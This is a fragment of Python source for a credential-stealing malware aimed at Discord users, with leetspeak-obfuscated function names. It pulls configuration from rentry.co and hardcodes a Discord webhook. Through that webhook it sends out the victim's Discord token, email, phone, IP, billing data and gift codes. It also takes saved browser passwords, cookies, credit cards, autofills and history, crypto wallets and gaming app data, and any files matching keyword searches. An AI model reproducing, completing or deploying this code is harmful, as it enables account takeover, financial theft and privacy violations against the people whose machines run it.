...
cname = "https://rentry.co/mmpizr/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

smallcname = "https://rentry.co/mmpizr/raw"
smallcnameresp = requests.get(smallcname)
smallcname = smallcnameresp.text

footerc = "https://rentry.co/cwrkf/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text

words = "https://rentry.co/cr6hy/raw"
wordsresp = requests.get(words)
words = wordsresp.text

h00k = "https://discord.com/api/webhooks/1203030809150234744/F0LmsvS0wpoOPSi6KvCpQtTXMAWSUX4YYWlfgF6iHnsxT2LURb4k7MNXZQKjiyqIKWyd"
...
def G37C0D35(token):
    try:
        ...
        for element in nitrocodess:
            ...
            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription;_plan_id={subscription_plan_id}"
    ...
    try:
        ...
        for guild in guilds:
            ...
            if guild["owner"] or guild["permissions"] == "4398046511103":
                ...
                uhqguilds += f"<:3_:1194819315141185567> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
...
def UP104D70K3N(token, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://cdn.discordapp.com/attachments/1194403402533322772/1197130337986297906/mapleleaf.png?ex=65ba2582&is=65a7b082&hm=5931b538efb0055a3c8e8990b1484ada69b8acde5b26314b74ee7d4fde3696b9&"
    ...
    data = {
        ...
        "embeds": [
            ...
            "fields": [
                {
                    "name": "<:3_:1194819315141185567> Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<:2_:1194819317439676447> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:2_:1194819317439676447> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<:10:1194819293758640138> IP:",
                    "value": f"`{G371P()}`",
                    "inline": True
                },
                {
                    "name": "<:9_:1194819294844952598> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<:8_:1194819297520910507> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:3_:1194819315141185567> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                },
                {
                    "name": "<:3_:1194819315141185567> HQ Guilds:",
                    "value": f"{guilds}",
                    "inline": False
                },
                {
                    "name": "<:6_:1194819301459382365> Gift Codes:",
                    "value": f"{codes}",
                    "inline": False
                }
                ],
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://cdn.discordapp.com/attachments/1194403402533322772/1197130337986297906/mapleleaf.png?ex=65ba2582&is=65a7b082&hm=5931b538efb0055a3c8e8990b1484ada69b8acde5b26314b74ee7d4fde3696b9&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1194403402533322772/1197130337986297906/mapleleaf.png?ex=65ba2582&is=65a7b082&hm=5931b538efb0055a3c8e8990b1484ada69b8acde5b26314b74ee7d4fde3696b9&",
        "attachments": []
        }
...
def G378r0W53r5(br0W53rP47H5):
    ...
    for file in ["MaplePasswords.txt", "MapleCookies.txt", "MapleCC.txt", "MapleAutofills.txt", "MapleHistories.txt", "MapleBookmarks.txt"]:
        ...
        "embeds": [
            {
                ...
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:7_:1194819298930196603> • **{P455WC0UNt}** Passwords Found\n<:3_:1194819315141185567> • [{cname}Passwords.txt]({filess[0]})",
                "color": 2895667,
            ...
            },
            {
                ...
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:7_:1194819298930196603> • **{C00K1C0UNt}** Cookies Found\n<:3_:1194819315141185567> • [{cname}Cookies.txt]({filess[1]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://cdn.discordapp.com/attachments/1194403402533322772/1197130337986297906/mapleleaf.png?ex=65ba2582&is=65a7b082&hm=5931b538efb0055a3c8e8990b1484ada69b8acde5b26314b74ee7d4fde3696b9&"}
            },
            {
                ...
                "description": f"<:7_:1194819298930196603> • **{H1570rYC0UNt}** Histories Found\n<:3_:1194819315141185567> • [{cname}Histories.txt]({filess[4]})\n\n<:7_:1194819298930196603> • **{AU70F111C0UNt}** Autofills Found\n<:3_:1194819315141185567> • [{cname}Autofills.txt]({filess[3]})\n\n<:7_:1194819298930196603> • **{CC5C0UNt}** Credit Cards Found\n<:3_:1194819315141185567> • [{cname}CreditCards.txt]({filess[2]})\n\n<:7_:1194819298930196603> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:3_:1194819315141185567> • [{cname}Bookmarks.txt]({filess[5]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://cdn.discordapp.com/attachments/1194403402533322772/1197130337986297906/mapleleaf.png?ex=65ba2582&is=65a7b082&hm=5931b538efb0055a3c8e8990b1484ada69b8acde5b26314b74ee7d4fde3696b9&"}
            }
...
def G47H3rZ1P5(paths1, paths2, paths3):
    ...
    if not len(W411375Z1p) == 0:
        wal = "<:7_:1194819298930196603>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = "<:7_:1194819298930196603>  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:7_:1194819298930196603>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
...
def K1W1F113(path, keywords):
    global K1W1F113s  # Assuming K1W1F113s is defined somewhere else in your code
    fifound = []
    ...
    for file in listOfFile:
        for word in keywords:
            if word in file.lower():
                ...
                if os.path.isfile(file_path) and os.stat(file_path).st_size < 500000 and ".lnk" not in file:
                    fifound.append([file_path, UP104D7060F113(file_path)])
                    break

                if os.path.isdir(file_path):
                    K1W1F113(file_path, keywords)
                    break
    ...
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            ...
            for ffil in foldlist:
                ...
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:3_:1194819315141185567> [{fileanme}]({b})\n"
            filetext += "\n"
...
for arg in K1W1F113s:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"<:3_:1194819315141185567> {foldpath}\n"
